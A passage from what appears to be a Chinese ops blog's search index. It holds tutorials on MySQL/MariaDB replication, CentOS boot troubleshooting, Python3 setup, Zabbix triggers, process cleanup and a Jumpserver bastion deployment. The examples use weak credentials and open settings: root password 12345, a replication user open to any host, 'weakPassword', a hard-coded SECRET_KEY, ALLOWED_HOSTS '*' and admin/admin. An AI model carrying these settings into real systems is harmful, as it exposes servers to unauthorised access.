| a || 3 | b || 5 | c || 7 | d |+----+------+4 rows in set (0.00 sec) 在master1的中查看是否有刚刚在master2中插入的数据12345678910mysql&gt; select * from employee;+----+------+| id | name |+----+------+| 1 | a || 3 | b || 5 | c || 7 | d |+----+------+4 rows in set (0.00 sec) 部分内容参考自互联网，如有雷同，纯属借鉴","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"双主复制","slug":"双主复制","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E4%B8%BB%E5%A4%8D%E5%88%B6/"},{"name":"主主同步","slug":"主主同步","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%B8%BB%E5%90%8C%E6%AD%A5/"},{"name":"Master-Master","slug":"Master-Master","permalink":"https://garywu520.github.io/tags/Master-Master/"}]},{"title":"CentOS启动卡在进度条问题处理","slug":"CentOS启动卡在进度条问题处理","date":"2018-11-26T01:40:39.000Z","updated":"2018-11-26T01:54:04.615Z","comments":true,"path":"2018/11/26/CentOS启动卡在进度条问题处理/","link":"","permalink":"https://garywu520.github.io/2018/11/26/CentOS%E5%90%AF%E5%8A%A8%E5%8D%A1%E5%9C%A8%E8%BF%9B%E5%BA%A6%E6%9D%A1%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/","excerpt":"","text":"1CentOS开机的时候卡在进度条一直进不去, 接下来查找罪魁祸首。 查看启动过程中的问题123启动菜单按“e” 进入编辑状态，然后移动到第二项kernel...接着按e进入编辑。去掉“rhgb quiet” 字样，按回车保存回到选择项，再按b启动它就能看到启动过程了 1注意查看启动过程中卡在哪里？可以按f5键进度条&#x2F;命令行界面方式切换，确认卡问题后处理就好，比如我的就卡在开机启动MySQL上，一直进不去系统，所以可以使用单用户模式进入系统把MySQL启动项关闭后在进系统就没有问题了。 进入单用户模式，关闭服务启动项1234进入单用户模式:把ro改成rw，（把只读改成可写），再把rhgb quiet删除，最后增加init&#x3D;&#x2F;bin&#x2F;bash设置完毕后，Ctrol+X来","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"centos6","slug":"centos6","permalink":"https://garywu520.github.io/tags/centos6/"},{"name":"启动卡在进度条","slug":"启动卡在进度条","permalink":"https://garywu520.github.io/tags/%E5%90%AF%E5%8A%A8%E5%8D%A1%E5%9C%A8%E8%BF%9B%E5%BA%A6%E6%9D%A1/"}]},{"title":"编译安装Python3及扩展","slug":"编译安装Python3及扩展","date":"2018-11-23T03:24:24.000Z","updated":"2018-12-12T09:13:43.683Z","comments":true,"path":"2018/11/23/编译安装Python3及扩展/","link":"","permalink":"https://garywu520.github.io/2018/11/23/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Python3%E5%8F%8A%E6%89%A9%E5%B1%95/","excerpt":"12主要介绍如何编译安装Python3以及pip的安装。还包括扩展包的安装、查看与卸载 安装编译依赖1yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release","text":"12主要介绍如何编译安装Python3以及pip的安装。还包括扩展包的安装、查看与卸载 安装编译依赖1yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release 编译安装Python3123wget https:&#x2F;&#x2F;www.python.org&#x2F;ftp&#x2F;python&#x2F;3.6.1&#x2F;Python-3.6.1.tar.xztar xvf Python-3.6.1.tar.xz &amp;&amp; cd Python-3.6.1.&#x2F;configure &amp;&amp; make &amp;&amp; make install 建立Python虚拟环境123cd &#x2F;optpython3 -m venv py3source &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate 1234# 看到下面的提示符代表成功(py3) [root@localhost py3]注：退出python环境命令 dactivate 自动载入Python虚拟环境123cd &#x2F;optecho &#39;&#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate&#39; &gt;&gt; ~&#x2F;.bashrcsource ~&#x2F;.bashrc 安装pip命令12345#pip命令可以直接通过官网脚本安装wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.pypython3 get-pip.py注：如果报错，说明缺少依赖，使用yum安装即可 自动安装python官方库1234567上面pip正确安装后，会出现命令：easy_install-3.6自动安装扩展包(常用)：easy_install-3.6 requests easy_install-3.6 datetime easy_install-3.6 scrapyeasy_install-3.6 jsonpath 手动安装python第三方库1官网：https:&#x2F;&#x2F;www.lfd.uci.edu&#x2F;~gohlke&#x2F;pythonlibs&#x2F; 12安装命令：pip install Scrapy.xxxx.whl 1234567示例：比如要搜索下载并安装Scrapy，找到对应版本的whl文件下载。注：py2表示支持python2.X版本；py3表示支持python3.X版本； cp27表示支持Python2.7版本,cp35表示支持python3.5版本；如果版本不正确,将出现如下错误：pendulum-2.0.3-cp37-cp37m-win_amd64.whl is not a supported wheel on this platform. 查看现有package列表1234567891011# pip listPackage Version ---------------- ----------certifi 2018.10.15chardet 3.0.4 cssselect 1.0.3 DateTime 4.3 idna 2.7 ............ 卸载库123pip uninstall [package_name]注：卸载完成之后到&#x2F;opt&#x2F;python3&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;目录下检查package文件夹是否还在，如果还在，[使用dactivate命令退出python环境,再删除]删除之。 一键安装所有Python扩展123如果要安装的扩展非常多，有没有方法，一键安装所有已知扩展呢？答案是肯定的。注：扩展包的版本是跟随Python版本而定的，不同版本的Python依赖包安装会出现错误。 方案: 123原服务器获取扩展包列表到文件pip freeze &gt; requirements.txt 生成扩展包信息列表到文件中pip install -r requirements.txt 从requirements.txt文件中安装所有扩展","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"python","slug":"python","permalink":"https://garywu520.github.io/tags/python/"},{"name":"python3","slug":"python3","permalink":"https://garywu520.github.io/tags/python3/"},{"name":"pip","slug":"pip","permalink":"https://garywu520.github.io/tags/pip/"}]},{"title":"mariadb主从复制-注意事项","slug":"mariadb主从复制-注意事项","date":"2018-11-14T09:48:45.000Z","updated":"2018-11-14T10:23:44.629Z","comments":true,"path":"2018/11/14/mariadb主从复制-注意事项/","link":"","permalink":"https://garywu520.github.io/2018/11/14/mariadb%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"123CentOS7 在Yum安装MariaDB后，如果有需求做主从，又不想重新编译MySQL5.6，那么就需要看看如下注意事项。以下阐述的注意事项并非是MySQL与MariaDB底层的区别，而是编译安装与Yum安装的区别！ 回顾下Mariadb Yum安装123yum -y install mariadb mariadb-devel mariadb-server # centos7下安装的是mariadbsystemctl enable mariadbsystemctl start mariadb 配置管理密码为12345 12mysqladmin -uroot -p password 12345 注：默认密码为空","text":"123CentOS7 在Yum安装MariaDB后，如果有需求做主从，又不想重新编译MySQL5.6，那么就需要看看如下注意事项。以下阐述的注意事项并非是MySQL与MariaDB底层的区别，而是编译安装与Yum安装的区别！ 回顾下Mariadb Yum安装123yum -y install mariadb mariadb-devel mariadb-server # centos7下安装的是mariadbsystemctl enable mariadbsystemctl start mariadb 配置管理密码为12345 12mysqladmin -uroot -p password 12345 注：默认密码为空 需求现在要做MariaDB主从1234567891011121314151617181920212223242526根据以往给MySQL做主从的经验，主库应该进行如下操作：(1) 主库和从库均需要修改&#x2F;etc&#x2F;my.cnf配置文件(主要配置server-id和log-bin位置),并重启MariaDB 主库： server-id&#x3D;50 log-bin&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;log-bin 从库： server-id&#x3D;55 log-bin&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;log-bin (2) 查看现有Position号 show master status;(3) 导出所有数据库到从库服务器 mysqldump -uroot -p --all-databases &gt;&#x2F;root&#x2F;all.sql(4) 从库导入所有数据库 mysql -uroot -p &lt; &#x2F;root&#x2F;all.sql(5) 主库创建主从复制账户 grant replication slave on *.* to repl@&#39;%&#39; identified by &#39;repl123&#39;;(6) 从库CHANGE MASTER To, 最后start slave;show slave status\\G; CHANGE MASTER TO MASTER_HOST&#x3D;&#39;10.1.0.15&#39;, MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;repl123&#39;, MASTER_PORT&#x3D;3306, MASTER_LOG_FILE&#x3D;&#39;mysql-bin.000001&#39;, MASTER_LOG_POS&#x3D;245; 坑1：步骤2中查看position号1234MariaDB [(none)]&gt; show master status;Empty set (0.00 sec)结果：为空！！！ 踩坑[MariaDB主从都需要设置]： 123456789101112这是因为MariaDB我们是Yum安装的, 而yum默认安装mysql在&#x2F;usr&#x2F;shara&#x2F;mysql目录下。(1)需要执行：cp &#x2F;usr&#x2F;shara&#x2F;mysql&#x2F;my-medium.cnf &#x2F;etc&#x2F;my.cnf(2)然后在my.cnf配置文件的[mysqld]模块下指定ServerID和开启binlog server-id&#x3D;1 #指定server ID log-bin&#x3D;mysql-bin #开启binlog(3)重启Mariadb(4)再次查看position show master status; 坑2：步骤6-从库CHANGE MASTER To123在此步骤中，从库CHANGE MASTER To后， start slave;命令执行报错，错误如下：MariaDB [(none)]&gt; start slave;ERROR 1200 (HY000): The server is not configured as slave; fix in config file or with CHANGE MASTER TO 踩坑： 12345678910这个问题很可能是master和slave的server-id重复了或者从库的server-id比主库的server-id的优先级高，那就奇怪了，我明明在配置文件里面指定了server-id的了，并且有重启mysql服务，难道不起效？分别在MariaDB主从服务器执行如下命令来查看server-id: show variables like &#39;server_id&#39;; 我的情况是主库server-id&#x3D;5，从库server-id&#x3D;0, 所以从库slave start命令肯定失败。问题解决：分别在MariaDB主从的命令行修改server-id:主库：SET GLOBAL server_id&#x3D;5;从库: SET GLOBAL server_id&#x3D;10;最后再在从库执行：slave status;show slave status\\G; 参考：寒烟夜陨 和 初级水泥工","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mariadb主从","slug":"mariadb主从","permalink":"https://garywu520.github.io/tags/mariadb%E4%B8%BB%E4%BB%8E/"},{"name":"mysql主从","slug":"mysql主从","permalink":"https://garywu520.github.io/tags/mysql%E4%B8%BB%E4%BB%8E/"},{"name":"mariadb","slug":"mariadb","permalink":"https://garywu520.github.io/tags/mariadb/"},{"name":"主从复制","slug":"主从复制","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"}]},{"title":"zabbix触发器表达式-详解","slug":"zabbix触发器表达式-详解","date":"2018-11-02T10:04:32.000Z","updated":"2018-11-02T10:37:00.806Z","comments":true,"path":"2018/11/02/zabbix触发器表达式-详解/","link":"","permalink":"https://garywu520.github.io/2018/11/02/zabbix%E8%A7%A6%E5%8F%91%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%AF%A6%E8%A7%A3/","excerpt":"1有个项目需求：zabbix监控交换机的2个接口流量，具体来说是出口流量。想通过zabbix实现将2个接口流量相加，当达到某个值的时候，进行告警。 注意事项1注：添加监控项之前，需要查阅对应交换机型号的OID以及对应接口的MIB值，MIB即ifInOctets或ifOutOctets，表示交换机的上行和下行流量，并且这个流量默认是该端口累加的流量，单位Byte字节。","text":"1有个项目需求：zabbix监控交换机的2个接口流量，具体来说是出口流量。想通过zabbix实现将2个接口流量相加，当达到某个值的时候，进行告警。 注意事项1注：添加监控项之前，需要查阅对应交换机型号的OID以及对应接口的MIB值，MIB即ifInOctets或ifOutOctets，表示交换机的上行和下行流量，并且这个流量默认是该端口累加的流量，单位Byte字节。 为了能获取端口的真实流量，并且最后以人类可读的M方式显示流量，需要进行如下操作： (1) 添加监控项1234567891011121314名称： 万兆-XXGigabitEthernet1&#x2F;1&#x2F;1-Out类型： SNMPv2端点代理程式键值： ifOutOctets.56SNMP OID：1.3.6.1.2.1.2.2.1.16.56SNMP community： &quot;团体名称&quot;端口(埠): 161数据类型：数字的（无正负）数据类型：十进位数字单位： bps使用自订倍数： 8存储值： 差量（每秒速率）启用：勾选注：使用自定义倍数8，单位bps.如果不设置自定义倍数，流量默认会以Byte(即字节)单位显示。 使用同样方法，添加另一个接口的监控项 (2) 添加触发器12345新建触发器:名称：流量超过500M，请立刻检查！表达式： &#123;hostname:ifHCOutOctets.56.last()&#125;+&#123;hostname:ifOutOctets.30.last()&#125;&gt;314572800严重性： 严重已启用： 勾选 表达式含义： 123将&#123;hostname:ifHCOutOctets.56.last()&#125;和&#123;hostname:ifOutOctets.30.last()&#125;的最末的流量加起来，如果大于300M，则进行告警。注：表达式中的流量,单位是Byte, 注意换算。 表达式参考：官网","categories":[],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"触发器","slug":"触发器","permalink":"https://garywu520.github.io/tags/%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"name":"表达式","slug":"表达式","permalink":"https://garywu520.github.io/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"流量叠加","slug":"流量叠加","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E9%87%8F%E5%8F%A0%E5%8A%A0/"},{"name":"触发器表达式","slug":"触发器表达式","permalink":"https://garywu520.github.io/tags/%E8%A7%A6%E5%8F%91%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"find删除文件错误-Argument list too long","slug":"find删除文件错误-Argument list too long","date":"2018-11-01T09:02:20.000Z","updated":"2018-11-01T11:46:56.062Z","comments":true,"path":"2018/11/01/find删除文件错误-Argument list too long/","link":"","permalink":"https://garywu520.github.io/2018/11/01/find%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E9%94%99%E8%AF%AF-Argument%20list%20too%20long/","excerpt":"123服务器使用一段时间，&#x2F;tmp目录可能会产生很多小文件，有的是log，有的是研发打印的日志文件等，而想要清理，绝非得费点功夫。find结合xargs来删除小文件遇到错误：&#x2F;bin&#x2F;find: Argument list too long","text":"123服务器使用一段时间，&#x2F;tmp目录可能会产生很多小文件，有的是log，有的是研发打印的日志文件等，而想要清理，绝非得费点功夫。find结合xargs来删除小文件遇到错误：&#x2F;bin&#x2F;find: Argument list too long 最佳解决方案 12cd &#x2F;tmpfind . -mindepth 1 -mtime +7 -delete #删除7天之前的数据","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tmp","slug":"tmp","permalink":"https://garywu520.github.io/tags/tmp/"},{"name":"find","slug":"find","permalink":"https://garywu520.github.io/tags/find/"},{"name":"Argument list too long","slug":"Argument-list-too-long","permalink":"https://garywu520.github.io/tags/Argument-list-too-long/"},{"name":"rm","slug":"rm","permalink":"https://garywu520.github.io/tags/rm/"}]},{"title":"批量kill终止多个进程","slug":"批量kill终止多个进程","date":"2018-11-01T02:02:31.000Z","updated":"2018-11-01T02:06:27.872Z","comments":true,"path":"2018/11/01/批量kill终止多个进程/","link":"","permalink":"https://garywu520.github.io/2018/11/01/%E6%89%B9%E9%87%8Fkill%E7%BB%88%E6%AD%A2%E5%A4%9A%E4%B8%AA%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"1缘由：脚本中在原基础上新增了一个while循环，而逻辑错误导致脚本运行的进程多大50+，进而顶死CPU。 批量终止脚本进程1234首先需要关闭crontab停止运行此脚本。批量kill命令：ps -ef|grep &quot;脚本名称&quot; |grep -v grep |awk &#39;&#123;print $2&#125;&#39;|xargs kill -9","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"kill","slug":"kill","permalink":"https://garywu520.github.io/tags/kill/"},{"name":"进程","slug":"进程","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"批量kill进程","slug":"批量kill进程","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8Fkill%E8%BF%9B%E7%A8%8B/"}]},{"title":"CentOS7部署Jumpserver V1.4.3跳板机","slug":"CentOS7部署Jumpserver-V1-4-3跳板机","date":"2018-10-29T01:57:14.000Z","updated":"2018-10-29T01:59:18.479Z","comments":true,"path":"2018/10/29/CentOS7部署Jumpserver-V1-4-3跳板机/","link":"","permalink":"https://garywu520.github.io/2018/10/29/CentOS7%E9%83%A8%E7%BD%B2Jumpserver-V1-4-3%E8%B7%B3%E6%9D%BF%E6%9C%BA/","excerpt":"环境123456789IP：10.0.10.88内存：≥4GB数据库： mysql 版本大于等于 5.6 mariadb 版本大于等于 5.5.6SELINUX: 关闭Firewalld: stop + disable注：不计划用它管理windows资产，故windows支持性组件未纳入部署范围。 字符集设置1234# 修改字符集，否则可能报 input&#x2F;output error的问题，因为日志里打印了中文localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8export LC_ALL&#x3D;zh_CN.UTF-8echo &#39;LANG&#x3D;zh_CN.UTF-8&#39; &gt; &#x2F;etc&#x2F;sysconfig&#x2F;i18n","text":"环境123456789IP：10.0.10.88内存：≥4GB数据库： mysql 版本大于等于 5.6 mariadb 版本大于等于 5.5.6SELINUX: 关闭Firewalld: stop + disable注：不计划用它管理windows资产，故windows支持性组件未纳入部署范围。 字符集设置1234# 修改字符集，否则可能报 input&#x2F;output error的问题，因为日志里打印了中文localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8export LC_ALL&#x3D;zh_CN.UTF-8echo &#39;LANG&#x3D;zh_CN.UTF-8&#39; &gt; &#x2F;etc&#x2F;sysconfig&#x2F;i18n 准备Python3和Python虚拟环境12安装依赖包yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release git 12345编译安装Python3wget https:&#x2F;&#x2F;www.python.org&#x2F;ftp&#x2F;python&#x2F;3.6.1&#x2F;Python-3.6.1.tar.xztar xvf Python-3.6.1.tar.xz &amp;&amp; cd Python-3.6.1.&#x2F;configure &amp;&amp; make &amp;&amp; make install 12345678910建立 Python 虚拟环境cd &#x2F;optpython3 -m venv py3source &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate# 看到下面的提示符代表成功(py3) [root@localhost py3]注：如果未配置自动载入 Python 虚拟环境设置，则以后运行 Jumpserver都要先运行以上 source 命令，以下所有命令均在该虚拟环境中运行 12345自动载入 Python 虚拟环境设置cd &#x2F;optgit clone https:&#x2F;&#x2F;github.com&#x2F;kennethreitz&#x2F;autoenv.gitecho &#39;source &#x2F;opt&#x2F;autoenv&#x2F;activate.sh&#39; &gt;&gt; ~&#x2F;.bashrcsource ~&#x2F;.bashrc 安装jumpserver1234下载jumpservercd &#x2F;opt&#x2F;git clone https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver.git &amp;&amp; cd jumpserver &amp;&amp; git checkout masterecho &quot;source &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate&quot; &gt; &#x2F;opt&#x2F;jumpserver&#x2F;.env # 进入 jumpserver 目录时将自动载入 python 虚拟环境 123安装依赖 RPM 包cd &#x2F;opt&#x2F;jumpserver&#x2F;requirementsyum -y install $(cat rpm_requirements.txt) 12安装 Python 库依赖pip install -r requirements.txt 安装redis12345Jumpserver 使用 Redis 做 cache 和 celery brokeyum -y install redissystemctl enable redissystemctl start redissystemctl status redis 安装MySQL123yum -y install mariadb mariadb-devel mariadb-server # centos7下安装的是mariadbsystemctl enable mariadbsystemctl start mariadb 123456创建数据库 Jumpserver 并授权# mysql&gt; create database jumpserver default charset &#39;utf8&#39;;&gt; grant all on jumpserver.* to &#39;jumpserver&#39;@&#39;127.0.0.1&#39; identified by &#39;weakPassword&#39;;&gt; flush privileges; 安装nginx123yum install -y nginxsystemctl enable nginxsystemctl start nginx 修改Jumpserver配置文件123cd &#x2F;opt&#x2F;jumpservercp config_example.py config.pyvim config.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import osBASE_DIR &#x3D; os.path.dirname(os.path.abspath(__file__))class Config: SECRET_KEY &#x3D; os.environ.get(&#39;SECRET_KEY&#39;) or &#39;9BY8IY9LpenB5M5fMcX0jYwmLWIlNVuZanQlkypbjgZ9t4rWoW&#39; ALLOWED_HOSTS &#x3D; [&#39;*&#39;] DEBUG &#x3D; os.environ.get(&quot;DEBUG&quot;) or False LOG_LEVEL &#x3D; os.environ.get(&quot;LOG_LEVEL&quot;) or &#39;WARNING&#39; LOG_DIR &#x3D; os.path.join(BASE_DIR, &#39;logs&#39;) DB_ENGINE &#x3D; os.environ.get(&quot;DB_ENGINE&quot;) or &#39;mysql&#39; DB_HOST &#x3D; os.environ.get(&quot;DB_HOST&quot;) or &#39;127.0.0.1&#39; DB_PORT &#x3D; os.environ.get(&quot;DB_PORT&quot;) or 3306 DB_USER &#x3D; os.environ.get(&quot;DB_USER&quot;) or &#39;jumpserver&#39; DB_PASSWORD &#x3D; os.environ.get(&quot;DB_PASSWORD&quot;) or &#39;weakPassword&#39; DB_NAME &#x3D; os.environ.get(&quot;DB_NAME&quot;) or &#39;jumpserver&#39; HTTP_BIND_HOST &#x3D; &#39;0.0.0.0&#39; HTTP_LISTEN_PORT &#x3D; 8080 REDIS_HOST &#x3D; os.environ.get(&quot;REDIS_HOST&quot;) or &#39;127.0.0.1&#39; REDIS_PORT &#x3D; os.environ.get(&quot;REDIS_PORT&quot;) or 6379 REDIS_PASSWORD &#x3D; os.environ.get(&quot;REDIS_PASSWORD&quot;) or &#39;&#39; REDIS_DB_CELERY &#x3D; os.environ.get(&#39;REDIS_DB&#39;) or 3 REDIS_DB_CACHE &#x3D; os.environ.get(&#39;REDIS_DB&#39;) or 4 def __init__(self): pass def __getattr__(self, item): return Noneclass DevelopmentConfig(Config): passclass TestConfig(Config): passclass ProductionConfig(Config): pass# Default using Config settings, you can write if&#x2F;else for different envconfig &#x3D; DevelopmentConfig() 生成数据库表结构和初始化数据12cd &#x2F;opt&#x2F;jumpserver&#x2F;utilsbash make_migrations.sh 运行 Jumpserver1234cd &#x2F;opt&#x2F;jumpserver.&#x2F;jms start all 注：后台运行命令： .&#x2F;jms start all -d 1234运行不报错，请浏览器访问 http:&#x2F;&#x2F;10.0.10.88:8080&#x2F; 默认账号: admin 密码: admin 页面显示不正常先不用处理，继续往下操作，原因是因为 django 无法在非 debug 模式下加载静态资源, 后面搭建 nginx 代理后即可正常访问， 安装ssh server 和 websocket server: Coco12345source &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activatecd &#x2F;optsource &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activategit clone https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;coco.git &amp;&amp; cd coco &amp;&amp; git checkout masterecho &quot;source &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate&quot; &gt; &#x2F;opt&#x2F;coco&#x2F;.env #进入coco目录时将自动载入 python 虚拟环境 1234安装依赖cd &#x2F;opt&#x2F;coco&#x2F;requirementsyum -y install $(cat rpm_requirements.txt)pip install -r requirements.txt 12345修改coco配置文件cd &#x2F;opt&#x2F;cocomkdir keys logscp conf_example.py conf.py # 如果 coco 与 jumpserver 分开部署，请手动修改 conf.pyvim conf.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!&#x2F;usr&#x2F;bin&#x2F;env python3# -*- coding: utf-8 -*-#import osBASE_DIR &#x3D; os.path.dirname(__file__)class Config: &quot;&quot;&quot; Coco config file, coco also load config from server update setting below &quot;&quot;&quot; # 项目名称, 会用来向Jumpserver注册, 识别而已, 不能重复 # NAME &#x3D; &quot;localhost&quot; NAME &#x3D; &quot;coco&quot; # Jumpserver项目的url, api请求注册会使用 CORE_HOST &#x3D; os.environ.get(&quot;CORE_HOST&quot;) or &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39; # 启动时绑定的ip, 默认 0.0.0.0 # BIND_HOST &#x3D; &#39;0.0.0.0&#39; # 监听的SSH端口号, 默认2222 # SSHD_PORT &#x3D; 2222 # 监听的HTTP&#x2F;WS端口号，默认5000 # HTTPD_PORT &#x3D; 5000 # 项目使用的ACCESS KEY, 默认会注册,并保存到 ACCESS_KEY_STORE中, # 如果有需求, 可以写到配置文件中, 格式 access_key_id:access_key_secret # ACCESS_KEY &#x3D; None # ACCESS KEY 保存的地址, 默认注册后会保存到该文件中 # ACCESS_KEY_STORE &#x3D; os.path.join(BASE_DIR, &#39;keys&#39;, &#39;.access_key&#39;) # 加密密钥 # SECRET_KEY &#x3D; None # 设置日志级别 [&#39;DEBUG&#39;, &#39;INFO&#39;, &#39;WARN&#39;, &#39;ERROR&#39;, &#39;FATAL&#39;, &#39;CRITICAL&#39;] LOG_LEVEL &#x3D; &#39;WARN&#39; # 日志存放的目录 # LOG_DIR &#x3D; os.path.join(BASE_DIR, &#39;logs&#39;) # Session录像存放目录 # SESSION_DIR &#x3D; os.path.join(BASE_DIR, &#39;sessions&#39;) # 资产显示排序方式, [&#39;ip&#39;, &#39;hostname&#39;] # ASSET_LIST_SORT_BY &#x3D; &#39;ip&#39; # 登录是否支持密码认证 # PASSWORD_AUTH &#x3D; True # 登录是否支持秘钥认证 # PUBLIC_KEY_AUTH &#x3D; True # SSH白名单 # ALLOW_SSH_USER &#x3D; &#39;all&#39; # [&#39;test&#39;, &#39;test2&#39;] # SSH黑名单, 如果用户同时在白名单和黑名单，黑名单优先生效 # BLOCK_SSH_USER &#x3D; [] # 和Jumpserver 保持心跳时间间隔 # HEARTBEAT_INTERVAL &#x3D; 5 # Admin的名字，出问题会提示给用户 # ADMINS &#x3D; &#39;&#39; COMMAND_STORAGE &#x3D; &#123; &quot;TYPE&quot;: &quot;server&quot; &#125; REPLAY_STORAGE &#x3D; &#123; &quot;TYPE&quot;: &quot;server&quot; &#125; # SSH连接超时时间 (default 15 seconds) # SSH_TIMEOUT &#x3D; 15 # 语言 &#x3D; en LANGUAGE_CODE &#x3D; &#39;zh&#39;config &#x3D; Config() 1暂且不启动coco, 因为coco需要向jumpserver中注册，而jumpserver暂且还不能正常访问，需要先配置Nginx代理才行。因为jumpserver配置文件中启用了 DEBUG &#x3D; False参数的缘故。 安装 Web Terminal 前端: Luna12Luna 需要Nginx来运行访问Luna Releases: https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;luna&#x2F;releases 1234cd &#x2F;optwget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;luna&#x2F;releases&#x2F;download&#x2F;1.4.3&#x2F;luna.tar.gztar xvf luna.tar.gzchown -R root:root luna 配置 Nginx 整合各组件12前面已经安装了Nginx，故接下来直接配置配置文件。vim &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647server &#123; listen 80; #代理端口，以后将通过此端口进行访问，不再通过8080端口 server_name jumpserver.xx.cn; # 修改成你的域名 client_max_body_size 100m; #录像及文件上传大小限制 location &#x2F;luna&#x2F; &#123; try_files $uri &#x2F; &#x2F;index.html; alias &#x2F;opt&#x2F;luna&#x2F;; #luna 路径，如果修改安装目录，此处需要修改 &#125; location &#x2F;media&#x2F; &#123; add_header Content-Encoding gzip; root &#x2F;opt&#x2F;jumpserver&#x2F;data&#x2F;; #录像位置，如果修改安装目录，此处需要修改 &#125; location &#x2F;static&#x2F; &#123; root &#x2F;opt&#x2F;jumpserver&#x2F;data&#x2F;; #静态资源，如果修改安装目录，此处需要修改 &#125; location &#x2F;socket.io&#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:5000&#x2F;socket.io&#x2F;; #如果coco安装在别的服务器，请填写它的ip proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location &#x2F;coco&#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:5000&#x2F;coco&#x2F;; #如果coco安装在别的服务器，请填写它的ip proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:8080; #如果jumpserver安装在别的服务器，请填写它的ip proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 12nginx -t #检查nginx语法systemctl restart nginx Web正常访问jumpserver123windows配置host： 10.0.10.88 jumpserver.xx.cnWeb访问Jumpserver: http:&#x2F;&#x2F;jumpserver.xx.cn。账号和密码：admin 123注：Jumpserver正常访问的前提是jumpserver服务正常启动。可以使用如下命令检查cd &#x2F;opt&#x2F;jumpserver.&#x2F;jms status # 确定jumpserver已经运行，如果没有运行请重新启动jumpserver 接受Coco的API注册123456启动coco服务cd &#x2F;opt&#x2F;coco&#x2F;.&#x2F;cocod start #此时界面基本无响应，不过暂且不用管它注：新版本更新了运行脚本，使用方式.&#x2F;cocod start|stop|status|restart 后台运行请添加 -d 参数 12345#接受COCO的API注册请求：(1)Web访问Jumpserver: http:&#x2F;&#x2F;jumpserver.xx.cn。(2)会话管理-终端管理, 这里会看到一个以配置文件中指定的COCO名字的条目，点击最后的接受即可。(3)此时返回到服务器中，可以看到.&#x2F;cocod start命令正常启动了，可以看看5000和2222端口是否正常。 排坑 12执行 